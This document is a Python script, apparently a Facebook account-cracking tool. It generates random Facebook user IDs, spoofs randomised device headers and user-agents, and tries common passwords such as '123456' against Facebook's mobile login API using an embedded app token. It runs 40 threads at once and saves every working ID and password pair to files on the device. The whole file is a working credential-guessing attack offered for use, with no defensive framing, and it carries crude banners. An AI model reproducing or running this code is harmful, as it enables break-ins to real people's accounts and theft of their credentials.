#!/usr/bin/python3

import os,time,random,json,sys
try:
    import requests
except:
    os.system("pip3 install requests")
    import requests 
from concurrent.futures import ThreadPoolExecutor as ThreadPool




def ua():
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    rx=random.randrange(1, 999)
    xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
    return xx


def main():
    user=[]
    os.system("clear")
    limit=input(" input limit: ")
    print("—"*20)
    print("[1] 𝐌𝐀𝐃𝐄𝐑𝐒𝐔𝐃")
    print("[2] 𝐊𝐇𝐀𝐍𝐊𝐈𝐑𝐏𝐔𝐋𝐀")
    print("—"*20)
    ask=input("𝐅𝐔𝐂𝐊 𝐘𝐎𝐔𝐑 𝐆𝐅 !>")
    print("—"*20)
    if ask in["1"]:
        star="10000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,9999999999)))
            user.append(data)
    else:
        star="100000"
        for i in range(int(limit)):
            data=str(random.choice(range(100000000,999999999)))
            user.append(data)
    
    with ThreadPool(max_workers=40) as heron:
        print(" 𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇")
        
        print("—"*20)
        for mal in user:
            uid=star+mal
            heron.submit(login,uid)
    
loop=0
oks=[]

def login(uid):
    global oks,loop
    Session=requests.session()
    try:
        sys.stdout.write(f"\r \x1b[38;5;196m[\033[38;5;46mEHC\x1b[1;97m-\033[38;5;46mEMRAN\x1b[38;5;196m] \033[38;5;46m[{loop}-{len(oks)}]")
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","123123"]:
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": ua(), 
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
            if "session_key" in rp:
                print(f"\r\r [EHC-EMRAN] {uid} • {pw}")
                open("/sdcard/EHC-EMRAN-𝐅𝐔𝐂𝐊 𝐘𝐎𝐔𝐑 𝐆𝐅.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r [EHC-EMRAN] {uid} • {pw}")
                open("/sdcard/EHC-EMRAN-𝐃𝐀𝐓𝐀 𝐖𝐈𝐅𝐈 𝐖𝐎𝐑𝐊.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r [EHC-EMRAN] {uid} • {pw}")
                open("/sdcard/EHC-EMRAN-𝐅𝐔𝐂𝐊 𝐘𝐎𝐔𝐑 𝐆𝐅.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except:pass


main()

























